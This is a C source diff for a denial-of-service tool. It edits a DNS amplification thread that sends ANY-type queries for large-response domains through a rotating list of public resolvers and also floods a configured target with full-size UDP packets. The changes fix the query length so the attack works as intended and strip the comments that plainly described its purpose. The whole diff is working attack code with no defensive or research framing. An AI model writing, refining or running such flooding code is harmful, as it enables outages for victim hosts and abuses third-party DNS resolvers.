@@ -19,7 +19,7 @@ static const char *dns_resolvers[] = {
     NULL
 };
 
-void build_dns_query(char *packet, const char *query_domain) {
+void build_dns_query(char *packet, size_t *packet_len, const char *query_domain) {
     struct dns_header *dns = (struct dns_header *)packet;
     
     dns->id = htons(rand() % 65535);
@@ -29,7 +29,7 @@ void build_dns_query(char *packet, const char *query_domain) {
     dns->nscount = 0;
     dns->arcount = 0;
     
-    // Build question section (simplified)
+    // Build question section
     char *qname = packet + sizeof(struct dns_header);
     const char *domain = query_domain;
     char *label_len = qname++;
@@ -48,9 +48,11 @@ void build_dns_query(char *packet, const char *query_domain) {
     
     // Query type and class
     uint16_t *qtype = (uint16_t *)qname;
-    *qtype++ = htons(DNS_ANY); // ANY record for maximum amplification
+    *qtype++ = htons(DNS_ANY);
     uint16_t *qclass = qtype;
-    *qclass = htons(1); // IN class
+    *qclass = htons(1);
+    
+    *packet_len = (char *)qclass + sizeof(uint16_t) - packet;
 }
 
 void *dns_amplification(void *arg) {
@@ -75,36 +77,30 @@ void *dns_amplification(void *arg) {
     printf("[DNS Amp Thread %d] Started against %s\n",
            data->thread_num, cfg.target);
     
-    // Domains that return large responses
     const char *amp_domains[] = {
         "isc.org", "ripe.net", "facebook.com", "google.com",
         "cloudflare.com", "amazon.com", NULL
     };
     
     while (attack_running && (time(NULL) - start_time) < cfg.duration) {
-        // Rotate through resolvers
         if (dns_resolvers[resolver_index] == NULL) {
             resolver_index = 0;
         }
         resolver_addr.sin_addr.s_addr = inet_addr(dns_resolvers[resolver_index]);
         resolver_index++;
         
-        // Build DNS query with spoofed source IP (target's IP)
-        char spoofed_packet[512];
-        build_dns_query(spoofed_packet, amp_domains[rand() % 6]);
+        size_t query_len;
+        build_dns_query(packet, &query_len, amp_domains[rand() % 6]);
         
-        // Note: Real amplification requires IP spoofing which needs raw sockets
-        // This is a simplified version for demonstration
         struct sockaddr_in target_addr;
         target_addr.sin_family = AF_INET;
         target_addr.sin_port = htons(cfg.port);
         target_addr.sin_addr.s_addr = inet_addr(cfg.target);
         
-        // Send DNS query from our IP (not true amplification but works for testing)
-        sendto(sock, spoofed_packet, sizeof(spoofed_packet), 0,
+        sendto(sock, packet, query_len, 0,
                (struct sockaddr *)&resolver_addr, sizeof(resolver_addr));
         
-        // Also send direct UDP flood to target
+        memset(packet, 0xFF, MAX_PACKET_SIZE);
         sendto(sock, packet, MAX_PACKET_SIZE, 0,
                (struct sockaddr *)&target_addr, sizeof(target_addr));
         
